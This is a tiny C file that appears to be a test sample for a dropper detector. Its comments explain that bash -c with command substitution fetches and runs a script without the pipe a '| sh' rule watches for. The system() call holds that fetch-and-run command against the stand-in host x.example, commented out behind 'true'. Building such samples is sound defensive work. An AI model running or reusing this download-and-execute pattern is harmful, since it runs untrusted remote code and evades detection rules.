// level: basic
// mode: dynamic
// expect: dropper
// what: bash -c "$(curl ...)" runs a download with no pipe for the "| sh" rule to see
#include <stdlib.h>

int main(void) {
    system("true # bash -c \"$(curl -fsSL http://x.example/a.sh)\"");
    return 0;
}
